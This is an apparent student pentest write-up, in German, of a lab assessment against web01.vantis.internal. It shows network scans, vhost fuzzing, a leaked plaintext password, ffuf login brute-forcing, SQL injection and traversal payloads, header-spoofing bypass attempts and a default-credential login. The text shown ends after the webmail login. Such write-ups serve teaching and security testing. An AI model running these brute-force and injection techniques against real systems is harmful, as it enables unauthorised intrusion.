CYS II – Pentest Dokumentation & Analysepfad – Vantis Group
============================================================

:Projekt: CYS II – Pentest Dokumentation & Analysepfad – Vantis Group
:Autor: Haiko Nuding
:Klasse: H25b
:Status: Abgeschlossen
:Datum: 07.09.2026

.. note::

   **Assessment-Kontext**

   * **Zielbereich (In Scope):** ``10.47.64.0/18``
   * **Grösse des Zielnetzes:** 16'384 mögliche IPv4-Adressen
   * **Ausgeschlossenes Segment (Out of Scope):** ``10.145.37.0/24``
   * **Eigene Quell-IP:** ``10.145.37.123`` (Kali VM)
   * **Ziel:** Identifikation und Ausnutzung einer reproduzierbaren Angriffskette innerhalb des definierten Scopes.
   * **Einschränkungen:** Keine DoS-Angriffe, keine absichtliche Beschädigung oder Löschung und keine Angriffe auf Netzwerk-, Management- oder Orchestrierungsinfrastruktur.

.. rubric:: Inhaltsverzeichnis

.. contents::
   :local:
   :depth: 3
   :backlinks: top

.. note::

   **Leselogik dieser Dokumentation**

   * **Kapitel 1–8** bilden die übergeordnete Struktur des Assessments.
   * **Angriffspfad A–M** bezeichnet parallel untersuchte Hypothesen innerhalb von Kapitel 4.
   * Technische Tests wie ``Login-Baseline``, ``Traversal-Routing`` oder ``Host-Header Tests``
     sind Unterabschnitte des jeweiligen Angriffspfads.
   * Ab **Kapitel 5** beginnt der erfolgreiche Pivot, der schliesslich zu Flag 1 führt.


==============================================
Kapitel 1 – Executive Summary und Angriffspfad
==============================================

Ergebnis und finaler Angriffspfad
---------------------------------

Die Analyse führte über mehrere parallele und teilweise erfolglose
Hypothesen schliesslich zu einer vollständigen und reproduzierbaren
Angriffskette.

Eine wichtige Besonderheit des Analyseverlaufs war, dass das Passwort

``GoldSchafHirsch593``

bereits relativ früh über ``dev.vantis.internal`` gefunden wurde.

Zu diesem Zeitpunkt war jedoch noch nicht bekannt:

* zu welchem Benutzer das Passwort gehörte,
* für welchen konkreten Dienst es vorgesehen war,
* ob es direkt für das Deploy Portal verwendet werden konnte,
* oder ob es stattdessen als Schlüssel für einen anderen Angriffspfad diente.

Dadurch entstanden im weiteren Verlauf mehrere parallele Hypothesen.

Der schliesslich erfolgreiche Pfad war:

.. code-block:: text

   Host Discovery
        |
        v
   10.47.84.110 / web01.vantis.internal
        |
        v
   Virtual Host Discovery
        |
        +--> dev.vantis.internal
        +--> deploy.vantis.internal
        +--> mail.vantis.internal
        |
        v
   dev.vantis.internal
   /staging/internal/mail/backups/deploy_notes.txt
        |
        v
   Früher Credential-Fund
   GoldSchafHirsch593
        |
        +-----------------------------------------------+
        |                                               |
        | mehrere zunächst erfolglose Hypothesen        |
        |                                               |
        +--> Deploy Username Guessing                   |
        +--> Flask Session Forging                      |
        +--> SQL Injection                              |
        +--> Upload Traversal                           |
        +--> Mail Login mit vermuteten Benutzern        |
        +--> Port 8022 Direktzugriff                    |
        +--> Header-/Auth-Bypasses                      |
        |                                               |
        +-----------------------------------------------+
        |
        v
   Neubewertung von mail.vantis.internal
        |
        v
   Schwacher Webmail-Zugang
   vantis : vantis
        |
        v
   Inbox nennt Portal-Benutzer
   malik.da-costa
        |
        v
   Credential-Korrelation
   malik.da-costa : GoldSchafHirsch593
        |
        v
   Authentifizierung am Deploy Portal
        |
        v
   /diagnostics
   Command Injection über Parameter "action"
        |
        v
   Befehlsausführung als svc-vantis
        |
        v
   Zugriff auf localhost:
   http://127.0.0.1:8022/
        |
        v
   Personal Key Vault
        |
        v
   SSH Private Key id_ed25519
        |
        v
   SSH als malik.da-costa auf web01
        |
        v
   /home/malik.da-costa/user.txt
        |
        v
   Flag 1


===========================================
Kapitel 2 – Ausgangslage und Reconnaissance
===========================================

Ausgangslage und Rules of Engagement
------------------------------------

Für das Assessment war ausschliesslich das Netzwerk

``10.47.64.0/18``

freigegeben.

Die Kali-VM befand sich ausserhalb dieses Zielnetzes:

``10.145.37.123``

Das Netzwerk

``10.145.37.0/24``

war explizit nicht Teil des Zielbereichs und diente ausschliesslich als
Angreiferumgebung.

.. note::

    Folgende Aktivitäten waren ausgeschlossen:

    * Denial of Service
    * Resource Exhaustion
    * absichtliche Beschädigung
    * Datenlöschung
    * Angriffe ausserhalb von ``10.47.64.0/18``
    * Exploitation von Netzwerk-, Management- und Orchestrierungsinfrastruktur

Während der Analyse wurde insbesondere ``10.47.84.1`` als mögliche
Infrastrukturkomponente erkannt und nach der notwendigen
Charakterisierung nicht weiter angegriffen.


Initiale Netzwerkprüfung
------------------------

ICMP-Test
~~~~~~~~~

Zu Beginn wurde versucht, die Erreichbarkeit des Zielnetzes über einen
einfachen ICMP-Test zu prüfen.

**Befehl:**

.. code-block:: bash

   ping -c 3 10.47.64.1

**Relevante Ausgabe:**

.. code-block:: text

   From 10.145.37.254 icmp_seq=1 Destination Host Unreachable
   From 10.145.37.1 icmp_seq=2 Redirect Host(New nexthop: 10.145.37.254)

   --- 10.47.64.1 ping statistics ---
   2 packets transmitted, 0 received, 100% packet loss

**Analyse:**

Eine fehlende ICMP-Antwort bedeutet nicht zwingend, dass das Zielnetz
nicht erreichbar ist. ICMP kann gefiltert werden oder die getestete
Adresse kann unbelegt sein.

**Entscheidung:**

ICMP wurde nicht als alleinige Discovery-Methode verwendet.


Host Discovery
--------------

Erster Nmap Ping Sweep
~~~~~~~~~~~~~~~~~~~~~~

**Befehl:**

.. code-block:: bash

   nmap -sn 10.47.64.0/18 -oA ping_sweep

**Beobachtung:**

Der Scan benötigte aufgrund des grossen ``/18``-Netzes und vieler nicht
antwortender IP-Adressen relativ lange.

**Bewertung:**

Ein ``/18`` umfasst 16'384 mögliche Adressen. Standard-Timeouts und
ICMP-Filterung sind für eine schnelle Discovery ungünstig.


Zusätzliche Nmap-Varianten
~~~~~~~~~~~~~~~~~~~~~~~~~~

Im Verlauf wurden weitere Discovery-Varianten ausprobiert:

.. code-block:: bash

   nmap -sn -PE -PS22,80,443,8080 \
     --min-rate 1000 \
     10.47.64.0/18 \
     -oA fast_ping_sweep

   nmap -sn -PE -PS22,80,443,8080 \
     10.47.64.0/18 \
     -oA discovery_advanced

Diese Tests kombinierten ICMP- und TCP-basierte Discovery.


Masscan Discovery
~~~~~~~~~~~~~~~~~

Für eine schnelle portbasierte Discovery wurde anschliessend
``masscan`` eingesetzt.

**Befehl:**

.. code-block:: bash

   sudo masscan 10.47.64.0/18 \
     -p80,443,22,8080,8443,3389,21,445 \
     --rate 2000 \
     -oG masscan_discovery.txt

**Identifizierte Hosts:**

``10.47.84.1``

* 22/tcp offen

``10.47.84.110``

* 22/tcp offen
* 80/tcp offen

**Entscheidung:**

Beide Hosts wurden anschliessend vorsichtig charakterisiert.


Service Discovery
-----------------

Host 10.47.84.1
~~~~~~~~~~~~~~~

**Befehl:**

.. code-block:: bash

   nmap -sV -p22,53,80,443,8022 10.47.84.1

**Ergebnis:**

.. code-block:: text

   22/tcp   open    ssh       OpenSSH 10.3
   53/tcp   open    domain    dnsmasq 2.92rel2
   80/tcp   closed  http
   443/tcp  closed  https
   8022/tcp closed  oa-system

**SSH-Banner:**

.. code-block:: text

   SSH-2.0-OpenSSH_10.3

**Analyse:**

Die Kombination aus DNS mittels ``dnsmasq`` und SSH sowie das Fehlen der
Ziel-Webservices deutete auf eine Infrastrukturrolle hin.

**Entscheidung:**

Der Host wurde dokumentiert, aufgrund der Rules of Engagement jedoch
nicht weiter angegriffen.

.. figure:: ../../_static/img/sem4/cys_01.PNG
   :alt: Nmap-Service-Scan des Zielhosts web01.vantis.internal mit offenen Ports 22, 80 und 8022
   :align: center
   :width: 100%


Host 10.47.84.110
~~~~~~~~~~~~~~~~~

**Verwendete Befehle:**

.. code-block:: bash

   nmap -sV -p22,80,443,8080 10.47.84.110
   nmap -p- --min-rate=1000 10.47.84.110
   nmap -sV -p8022 10.47.84.110
   nmap -sV -p22,53,80,443,8022 10.47.84.110

**Validierter Stand:**

.. code-block:: text

   22/tcp   open   ssh    OpenSSH 10.2p1 Ubuntu
   80/tcp   open   http   nginx 1.28.3
   8022/tcp open   http   Gunicorn
   53/tcp   closed domain
   443/tcp  closed https

**SSH-Banner:**

.. code-block:: text

   SSH-2.0-OpenSSH_10.2p1 Ubuntu-2ubuntu3.6

**Hostname:**

``web01.vantis.internal``

**Entscheidung:**

``10.47.84.110`` wurde als zentraler Zielhost weiter analysiert.


DNS- und Hostname-Analyse
-------------------------

Interne Domain
~~~~~~~~~~~~~~

Beispiel:

.. code-block:: bash

   dig -x 10.47.84.110 @10.47.84.1

Dabei wurde die interne Domain

``vantis.internal``

identifiziert.


Zusätzliche DNS-Hypothesen
~~~~~~~~~~~~~~~~~~~~~~~~~~

Unter anderem wurden folgende Namen geprüft:

.. code-block:: bash

   dig @10.145.37.1 deploy.vantis.internal A
   dig @10.145.37.1 maya.vantis.internal ANY
   dig @10.47.84.1 maya.vantis.internal TXT
   dig @10.47.84.1 deploy.vantis.internal ANY

**Ergebnis:**

Diese Abfragen führten zu keinem direkten Credential- oder
Exploit-Hinweis.


Inkonsistente lokale Namensauflösung
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Später fiel auf, dass:

.. code-block:: bash

   getent hosts deploy.vantis.internal

mehrere Adressen zurückgab.

Die lokale ``/etc/hosts`` enthielt unter anderem:

.. code-block:: text

   10.47.84.1 deploy.vantis.internal
   10.47.84.110 web01.vantis.internal
   10.47.84.1 deploy.vantis.internal
   10.47.84.110 web01.vantis.internal
   10.47.84.110 vantis.internal dev.vantis.internal deploy.vantis.internal mail.vantis.internal

**Analyse:**

``deploy.vantis.internal`` war lokal widersprüchlich sowohl auf
``10.47.84.1`` als auch auf ``10.47.84.110`` eingetragen.

**Validierung:**

* ``10.47.84.1``: SSH + DNS, kein HTTP
* ``10.47.84.110``: SSH + nginx + Gunicorn

Zusätzlich:

.. code-block:: bash

   curl -H 'Host: deploy.vantis.internal' \
     http://10.47.84.110/

lieferte einen Redirect auf ``/login``.

**Entscheidung:**

Für die Webanalyse wurde der Host-Header explizit gegen
``10.47.84.110`` verwendet.


Virtual Host Enumeration
------------------------

Hauptseite vantis.internal
~~~~~~~~~~~~~~~~~~~~~~~~~~

Die Standardseite wurde untersucht.

**Beobachtung:**

* statische Landingpage
* Kontaktformular
* JavaScript unter ``/static/js/script.js``

Das JavaScript wurde überprüft:

.. code-block:: javascript

   document.getElementById('submit-vantis').addEventListener('click', () => {
       const fields = document.querySelectorAll('.form-control');
       fields.forEach(field => {
           field.value = '';
       });
   });

**Ergebnis:**

* keine API
* keine Credentials
* keine versteckten Endpunkte
* keine Login-Funktion

**Entscheidung:**

Der Haupt-VHost wurde nicht weiter priorisiert.


Virtual Host Fuzzing
~~~~~~~~~~~~~~~~~~~~

Mit ``ffuf`` wurde nach weiteren namensbasierten Anwendungen gesucht.

.. code-block:: bash

   ffuf \
     -u http://10.47.84.110/ \
     -H "Host: FUZZ.vantis.internal" \
     -w /usr/share/wordlists/dirb/common.txt

**Gefundene Hosts:**

* ``dev.vantis.internal``
* ``deploy.vantis.internal``
* ``mail.vantis.internal``

Diese drei Anwendungen bildeten anschliessend die Hauptangriffsfläche.


================================================
Kapitel 3 – Initialer Fund und Hypothesenbildung
================================================

Früher Schlüsselfund auf dev.vantis.internal
--------------------------------------------

Basisanalyse
~~~~~~~~~~~~

Die Startseite antwortete mit:

.. code-block:: text

   Internal use only.

Directory Enumeration identifizierte:

* ``/home``
* ``/releases``
* ``/staging``
* ``/index.html``

Mit abschliessendem Slash lieferten mehrere Verzeichnisse:

``403 Forbidden``


Staging-Struktur
~~~~~~~~~~~~~~~~

Weitere Pfadtests führten zu:

* ``/staging/internal/`` -> 403
* ``/staging/internal/mail/`` -> 403
* ``/staging/internal/mail/backups/`` -> 200

Der letzte Pfad stellte ein nginx Directory Listing bereit.


Sensitives Backup-Artefakt
~~~~~~~~~~~~~~~~~~~~~~~~~~

**Pfad:**

``/staging/internal/mail/backups/``

**Directory Listing:**

.. code-block:: text

   ../
   deploy_notes.txt

Die Datei wurde gelesen:

.. code-block:: bash

   curl -s \
     -H 'Host: dev.vantis.internal' \
     http://10.47.84.110/staging/internal/mail/backups/deploy_notes.txt

**Inhalt:**

.. code-block:: text

   # deploy notes - remove before go-live
   portal login: GoldSchafHirsch593
   TODO: change after initial login!


.. figure:: ../../_static/img/sem4/cys_02.PNG
   :alt: Auslesen der Datei deploy_notes.txt mit dem im Klartext gespeicherten Portal-Passwort
   :align: center
   :width: 100%

**Zentrale Erkenntnis:**

Das Secret

``GoldSchafHirsch593``

wurde bereits zu diesem relativ frühen Zeitpunkt der Analyse gefunden.

Die Datei bezeichnete den Wert zwar als ``portal login``, enthielt jedoch
keinen Benutzernamen.

Dadurch war unklar, wie das Secret konkret verwendet werden musste.

Diese Unsicherheit führte zu mehreren parallelen Analysepfaden.


Pivot-Punkt – Hypothesen nach dem Fund von GoldSchafHirsch593
-------------------------------------------------------------

Nach dem Fund des Passworts wurden mehrere mögliche Interpretationen
aufgestellt.

**Hypothese A:**

``GoldSchafHirsch593`` ist direkt das Passwort eines Deploy-Portal-
Benutzers.

**Hypothese B:**

Das Passwort gehört zu einem Service- oder Administrationsaccount.

**Hypothese C:**

Der Wert ist ein Flask-Secret oder ein anderer Applikationsschlüssel.

**Hypothese D:**

Das Passwort gehört zu einem Account auf ``mail.vantis.internal``.

**Hypothese E:**

Weitere Artefakte auf ``dev`` enthalten den dazugehörigen Benutzernamen.

**Hypothese F:**

Das Deploy Portal kann auch ohne gültigen Benutzer über eine
Webschwachstelle umgangen werden.

Diese Hypothesen wurden anschliessend einzeln getestet.


=====================================
Kapitel 4 – Untersuchte Angriffspfade
=====================================

.. note::

   In diesem Kapitel werden die parallel untersuchten Hypothesen bewusst mit
   **Buchstaben A–M** statt mit Kapitelnummern gekennzeichnet. Dadurch bleibt
   beim Lesen klar: Es handelt sich um alternative Analysepfade innerhalb
   derselben Phase und nicht um eigenständige Hauptkapitel.

Angriffspfad A – Weitere Artefakte auf dev
------------------------------------------

Da das Passwort bereits gefunden worden war, wurde zuerst versucht, auf
dem gleichen VHost einen passenden Benutzernamen oder weitere
Credentials zu finden.


Backup-Dateivarianten
~~~~~~~~~~~~~~~~~~~~~

Getestet wurden:

* ``deploy_notes.eml``
* ``deploy_notes.msg``
* ``deploy_notes.txt.bak``
* ``deploy_notes.bak``
* ``deploy_notes.old``

**Ergebnis:**

Keine zusätzliche Datei gefunden.


Weitere interne Verzeichnisse
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Unter anderem geprüft:

* ``/staging/internal/deploy/``
* ``/staging/internal/deployment/``
* ``/staging/internal/portal/``
* ``/staging/internal/web/``
* ``/staging/internal/web01/``
* ``/staging/internal/ops/``
* ``/staging/internal/users/``
* ``/staging/internal/credentials/``
* ``/staging/internal/secrets/``
* ``/staging/internal/ssh/``
* ``/staging/internal/keys/``
* ``/staging/internal/archives/``
* ``/staging/internal/exports/``
* ``/staging/internal/configs/``

**Ergebnis:**

Keine weiteren verwertbaren Pfade.


Home-Verzeichnis-Hypothesen
~~~~~~~~~~~~~~~~~~~~~~~~~~~

Es wurden verschiedene vermutete Benutzerpfade geprüft:

* ``/home/maya.hofmann/``
* ``/home/maya/``
* ``/home/mhofmann/``
* zugehörige ``.ssh``-Pfade

**Ergebnis:**

404

Weitere Enumeration fand:

* ``/home/login`` -> 301
* ``/home/login/`` -> 403
* ``/home/login/profile`` -> 301
* ``/home/login/profile/`` -> 403

Tiefere Enumeration lieferte keine relevanten Dateien.

**Entscheidung:**

Dieser Pfad wurde verworfen.


Release- und Archivsuche
~~~~~~~~~~~~~~~~~~~~~~~~

Getestete mögliche Artefaktnamen:

* deploy
* deploy-portal
* portal
* vantis-deploy
* web01
* web
* latest
* current
* production
* prod
* staging
* release
* backup
* source
* src
* app

mit Erweiterungen:

* ``.zip``
* ``.tar``
* ``.tar.gz``
* ``.tgz``
* ``.bak``
* ``.old``

**Ergebnis:**

Keine verwertbaren Release- oder Backup-Archive.


Source- und Config-Disclosure
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Unter anderem geprüft:

* ``/.git/HEAD``
* ``/.git/config``
* ``/.env``
* ``/app.py``
* ``/config.py``
* ``/settings.py``
* ``/requirements.txt``

**Ergebnis:**

Keine Source- oder Konfigurationsdateien offengelegt.


Angriffspfad B – Directory Traversal auf dev
--------------------------------------------

Da ein Directory Listing vorhanden war, wurde geprüft, ob über
Pfadnormalisierung Dateien ausserhalb des Webroots gelesen werden
konnten.


Pfadnormalisierung
~~~~~~~~~~~~~~~~~~

Beispiel:

.. code-block:: text

   /staging/internal/mail/backups/../backups/deploy_notes.txt

lieferte weiterhin die bekannte Datei.

Auch:

.. code-block:: text

   ../../mail/backups/deploy_notes.txt

wurde innerhalb der Webstruktur normalisiert.


Versuchter Webroot-Escape
~~~~~~~~~~~~~~~~~~~~~~~~~

Zielpfade:

.. code-block:: text

   /home/maya.hofmann/.ssh/id_ed25519
   /home/maya.hofmann/.ssh/id_rsa
   /etc/passwd

**Ergebnis:**

* geringe Traversal-Tiefen -> 404
* höhere Traversal-Tiefen -> teilweise 400
* kein Zugriff ausserhalb des Webroots

**Entscheidung:**

Directory Traversal über ``dev`` wurde verworfen.


Angriffspfad C – Direktes Credential Guessing am Deploy Portal
--------------------------------------------------------------

Login-Baseline
~~~~~~~~~~~~~~

``deploy.vantis.internal`` leitete auf:

``/login``

Das Formular verwendete:

.. code-block:: html

   <form method="post" action="/login">
     <input type="text" name="username">
     <input type="password" name="password">
   </form>

Fehlerbaseline:

.. code-block:: text

   HTTP 200
   Response-Grösse: 2591 Bytes
   Invalid username or password.


Manuelle Username-Kandidaten
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Da ``GoldSchafHirsch593`` bereits bekannt war, wurde versucht, den
passenden Benutzer zu identifizieren.

Unter anderem getestet:

* maya.hofmann
* maya
* mhofmann
* admin
* deploy
* deployer
* deployment
* ops
* operator
* portal
* portaladmin
* deployportal
* deploy-admin
* deploy_admin
* administrator
* sysadmin
* itadmin
* support
* vantis

jeweils mit:

``GoldSchafHirsch593``

Alle Versuche:

.. code-block:: text

   HTTP 200
   SIZE=2591
   Invalid username or password.

**Ergebnis:**

Kein Treffer.


Alternative Feldkombinationen
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Getestet wurden zusätzlich:

* leerer Body
* nur ``username``
* nur ``password``
* leerer Benutzername
* leeres Passwort
* nur ``GoldSchafHirsch593``
* zusätzlicher Parameter ``remember=1``

**Ergebnis:**

Keine Abweichung von der normalen Fehlerbaseline.


Grössere Username-Liste
~~~~~~~~~~~~~~~~~~~~~~~

Da die manuellen Kandidaten nicht funktionierten, wurde kontrolliert
eine vorhandene Namensliste getestet.

.. code-block:: bash

   ffuf \
     -u http://10.47.84.110/login \
     -H 'Host: deploy.vantis.internal' \
     -X POST \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'username=FUZZ&password=GoldSchafHirsch593' \
     -w /usr/share/dirb/wordlists/others/names.txt \
     -mc all \
     -fs 2591 \
     -rate 5

**Ergebnis:**

.. code-block:: text

   8607 getestete Usernamen
   0 Treffer
   0 Errors

**Bewertung:**

Das Passwort schien zwar aufgrund seines Fundorts sicherheitsrelevant,
der passende Account konnte auf diesem Weg jedoch nicht identifiziert
werden.

**Entscheidung:**

Weiteres blindes Username-Guessing wurde eingestellt.


Bootstrap- und Initial-Accounts
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Zusätzlich getestet:

* bootstrap
* setup
* installer
* initial
* initialadmin
* provisioning
* provisioner
* onboarding
* firstlogin
* first-login
* setupadmin
* setup-admin

Alle Antworten:

.. code-block:: text

   HTTP 200
   SIZE=2591

**Ergebnis:**

Kein Treffer.


Angriffspfad D – SQL Injection am Deploy Login
----------------------------------------------

Beispielhafte Payloads:

.. code-block:: text

   test'
   ' OR '1'='1' --
   ' OR 1=1 --
   admin' --

**Ergebnis:**

Alle Antworten entsprachen der normalen Fehlerbaseline.

Es traten keine SQL-Fehler oder Authentifizierungsabweichungen auf.

**Entscheidung:**

Keine einfache SQL Injection nachgewiesen.


Angriffspfad E – Flask Session Manipulation
-------------------------------------------

Da ``/logout`` einen Cookie namens ``session`` verwendete, wurde eine
Flask-basierte Session vermutet.

Beobachtung:

.. code-block:: text

   Set-Cookie: session=;
   HttpOnly;
   Path=/

Da das gefundene ``GoldSchafHirsch593`` möglicherweise auch ein
Applikationssecret hätte sein können, wurde diese Hypothese getestet.

``flask-unsign`` wurde verwendet.

Beispielhafte Sessions:

.. code-block:: python

   {"username": "maya.hofmann", "logged_in": True}

und:

.. code-block:: python

   {"_user_id": "maya.hofmann", "_fresh": True}

Weitere IDs:

* maya
* admin
* 1

**Ergebnis:**

``/dashboard`` leitete weiterhin auf ``/login`` um.

**Schlussfolgerung:**

``GoldSchafHirsch593`` war nicht auf diese Weise als Flask-Secret
nutzbar.

**Entscheidung:**

Session Forging verworfen.


Angriffspfad F – Deploy Endpoint Enumeration
--------------------------------------------

Identifizierte funktionale Routen:

* ``/dashboard``
* ``/diagnostics``
* ``/uploads``

Unauthentifiziert:

.. code-block:: text

   HTTP 302
   Location: /login

``OPTIONS`` zeigte:

``/dashboard``:

* GET
* HEAD
* POST
* OPTIONS

``/diagnostics``:

* GET
* HEAD
* POST
* OPTIONS

``/uploads``:

* GET
* HEAD
* OPTIONS


Angriffspfad G – Dynamische /uploads Route
------------------------------------------

Ein ``OPTIONS``-Request auf:

.. code-block:: text

   /uploads/test123

lieferte:

.. code-block:: text

   HTTP/1.1 200 OK
   Allow: OPTIONS, GET, HEAD

Eine Kontrollroute:

.. code-block:: text

   /does-not-exist-123

lieferte:

``404 Not Found``.

**Analyse:**

Damit war eine dynamische Flask-Route nach dem Muster:

``/uploads/<path>``

wahrscheinlich.


Vermutete SSH-Key-Dateien
~~~~~~~~~~~~~~~~~~~~~~~~~

Unter anderem getestet:

* ``/uploads/id_rsa``
* ``/uploads/id_ed25519``
* ``/uploads/maya.hofmann/id_rsa``
* ``/uploads/maya.hofmann/id_ed25519``
* ``/uploads/maya.hofmann/.ssh/id_rsa``
* ``/uploads/maya.hofmann/.ssh/id_ed25519``

Alle GET- und HEAD-Anfragen:

.. code-block:: text

   HTTP 302
   Location: /login

**Erkenntnis:**

Der Authentifizierungscheck erfolgte vor der Dateiauflösung.

Ein Dateiexistenz-Orakel war daher nicht möglich.


Traversal-Routing
~~~~~~~~~~~~~~~~~

Mit ``OPTIONS`` getestet:

.. code-block:: text

   test
   ../test
   ../../test
   %2e%2e/test
   ..%2ftest
   %2e%2e%2ftest

Beobachtung:

.. code-block:: text

   test                  -> 200
   ../test               -> 200
   ../../test            -> 400
   %2e%2e/test           -> 200
   ..%2ftest             -> 200
   %2e%2e%2ftest         -> 200

GET-Anfragen wurden jedoch weiterhin zu ``/login`` umgeleitet.

**Entscheidung:**

Der Pfad war technisch interessant, unauthentifiziert jedoch nicht
nutzbar.


Angriffspfad H – URL-Normalisierung und Auth-Bypass
---------------------------------------------------

Für ``/diagnostics`` getestet:

* ``/diagnostics``
* ``/diagnostics/``
* ``//diagnostics``
* ``/./diagnostics``
* ``/diagnostics/.``
* ``/diagnostics;``
* ``/%64iagnostics``

Für ``/uploads``:

* ``/uploads``
* ``/uploads/``
* ``//uploads``
* ``/./uploads``
* ``/uploads/.``
* ``/uploads;``
* ``/%75ploads``

**Ergebnis:**

* gültige bzw. normalisierte Route -> 302 nach ``/login``
* ungültige Varianten -> 404

**Entscheidung:**

Kein Auth-Bypass über URL-Normalisierung.


Angriffspfad I – Proxy- und Auth-Header
---------------------------------------

Getestete Header:

* ``X-Remote-User: maya.hofmann``
* ``X-Forwarded-User: maya.hofmann``
* ``X-Authenticated-User: maya.hofmann``
* ``Remote-User: maya.hofmann``
* ``X-Auth-Request-User: maya.hofmann``

Zusätzlich:

* ``X-Forwarded-For: 127.0.0.1``
* ``X-Real-IP: 127.0.0.1``

**Ergebnis:**

.. code-block:: text

   HTTP 302
   Location: /login

**Entscheidung:**

Kein Header-basierter Auth-Bypass.


Angriffspfad J – Static Alias / nginx Traversal
-----------------------------------------------

Kontrollrequest:

.. code-block:: text

   /static/bootstrap.min.css -> HTTP 200

Getestet:

* ``/static/../static/bootstrap.min.css``
* ``/static../``
* ``/static../app.py``
* ``/static../config.py``
* ``/static../requirements.txt``
* ``/static../.env``

**Ergebnis:**

HTTP 404

**Entscheidung:**

Kein nginx Alias Traversal.


Angriffspfad K – Weitere Deploy-Key- und Credential-Routen
----------------------------------------------------------

Gezielt getestet wurden unter anderem:

* keys
* key
* ssh
* ssh-keys
* ssh_keys
* sshkeys
* private-key
* private-keys
* credentials
* creds
* secrets
* files
* file-browser
* downloads
* artifacts
* backups
* users
* profiles
* storage
* browse

Alle:

.. code-block:: text

   HTTP 404
   SIZE=207

**Entscheidung:**

Keine zusätzlichen Key- oder Credential-Endpunkte gefunden.


Angriffspfad L – Port 8022 direkt von Kali
------------------------------------------

Der Full Port Scan hatte einen Gunicorn-Dienst auf TCP/8022 ergeben.

Direkter Test:

.. code-block:: bash

   curl http://10.47.84.110:8022/

**Ergebnis:**

.. code-block:: text

   403 Forbidden

Auch folgende Pfade lieferten 403:

* ``/``
* ``/login``
* ``/dashboard``
* ``/diagnostics``
* ``/uploads``


Host-Header Tests
~~~~~~~~~~~~~~~~~

Unter anderem:

* deploy.vantis.internal
* web01.vantis.internal
* vantis.internal
* localhost
* 127.0.0.1
* deploy
* web01
* internal
* deploy.internal
* deploy.local
* app
* backend

**Ergebnis:**

Immer:

``403 Forbidden``


Source-IP Header Spoofing
~~~~~~~~~~~~~~~~~~~~~~~~~

Getestet:

* ``X-Forwarded-For: 127.0.0.1``
* ``X-Real-IP: 127.0.0.1``
* weitere ``X-Forwarded-*``-Kombinationen

**Ergebnis:**

Weiterhin 403.

**Zwischenbewertung:**

Der Dienst war offensichtlich nicht direkt von der Kali-VM erreichbar.

Die Hypothese entstand, dass Port 8022 möglicherweise nur lokale
Requests akzeptiert.

Zu diesem Zeitpunkt bestand jedoch noch keine Möglichkeit, einen Request
direkt vom Zielhost aus abzusetzen.


Angriffspfad M – mail.vantis.internal mit dem gefundenen Passwort
-----------------------------------------------------------------

Basisanalyse
~~~~~~~~~~~~

Der Dienst identifizierte sich als:

``VantisMail Webclient v2.3.1-legacy``

Login-Felder:

* username
* password

Fehlerbaseline:

.. code-block:: text

   HTTP 200
   SIZE=2144
   Invalid username or password.


Credential-Korrelation mit GoldSchafHirsch593
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Da ``GoldSchafHirsch593`` bereits bekannt war, wurde geprüft, ob das
Passwort möglicherweise zu einem Mailaccount gehörte.

Getestete Benutzer:

* maya.hofmann
* maya
* mhofmann
* maya.hofmann@vantis.internal

jeweils mit:

``GoldSchafHirsch593``

**Ergebnis:**

Kein erfolgreicher Login.

Damit führte auch diese erste Interpretation des gefundenen Passworts
nicht weiter.


Endpoint Enumeration
~~~~~~~~~~~~~~~~~~~~

Bekannt:

* ``/login``
* ``/inbox``
* ``/logout``

Weitere Kandidaten:

* forgot
* reset
* messages
* api
* api/messages
* settings
* profile
* attachments
* downloads
* archive
* sent
* drafts
* trash
* compose
* contacts
* exports
* files

lieferten keine relevanten neuen Endpunkte.


SQL Injection
~~~~~~~~~~~~~

Username-Payloads:

.. code-block:: text

   test'
   ' OR '1'='1' --
   ' OR 1=1 --
   admin' --
   " OR "1"="1" --

Password-Payloads:

.. code-block:: text

   ' OR '1'='1' --
   ' OR 1=1 --
   ' OR ''='
   " OR "1"="1" --

Alle Antworten:

.. code-block:: text

   HTTP 200
   SIZE=2144
   Invalid username or password.

**Entscheidung:**

Keine triviale SQL Injection nachgewiesen.


Zwischenstand nach den untersuchten Angriffspfaden
--------------------------------------------------

Zu diesem Zeitpunkt waren folgende Punkte bestätigt:

1. ``10.47.84.110`` war der zentrale Zielhost.
2. Mehrere virtuelle Hosts waren vorhanden.
3. ``dev.vantis.internal`` enthielt ein reales Klartext-Secret.
4. Das Secret lautete ``GoldSchafHirsch593``.
5. Der passende Benutzername war unbekannt.
6. Direkte Deploy-Login-Versuche waren erfolglos.
7. Eine grössere Username-Liste war ebenfalls erfolglos.
8. SQL Injection führte nicht weiter.
9. Session Forging führte nicht weiter.
10. Traversal- und Upload-Hypothesen führten nicht weiter.
11. Port 8022 antwortete extern ausschliesslich mit 403.
12. ``mail.vantis.internal`` war vorhanden, aber die zuerst getesteten
    Credential-Kombinationen waren ungültig.

Die Analyse zeigte damit, dass das früh gefundene Passwort zwar ein
zentraler Baustein war, aber ohne den zugehörigen Kontext noch nicht
direkt eingesetzt werden konnte.


================================================
Kapitel 5 – Erfolgreicher Pivot und Exploitation
================================================

.. important::

   Ab hier wechselt die Dokumentation von den verworfenen bzw. nicht direkt
   erfolgreichen Hypothesen zum **erfolgreichen Pivot**. Die folgenden Schritte
   bauen aufeinander auf und führen schliesslich zum SSH-Zugang und zu Flag 1.

Neubewertung des Webmail-Dienstes
---------------------------------

Nach dem Ausschluss mehrerer komplexerer Exploit-Hypothesen wurde der
Webmail-Dienst erneut betrachtet.

Die Anwendung identifizierte sich als:

``VantisMail Webclient v2.3.1-legacy``

Da es sich um einen internen Legacy-Dienst handelte, wurde ein einzelner
begründeter Default-Credential-Test mit dem Produktnamen durchgeführt.

**Test:**

.. code-block:: bash

   curl -i -c /tmp/mail.jar \
     -H 'Host: mail.vantis.internal' \
     --data-urlencode 'username=vantis' \
     --data-urlencode 'password=vantis' \
     http://10.47.84.110/login

**Ergebnis:**

.. code-block:: text

   HTTP/1.1 302 FOUND
   Location: /inbox
   Set-Cookie: session=...

Der Login war erfolgreich.

**Finding:**

``vantis:vantis`` war als schwaches Default-Credential gültig.


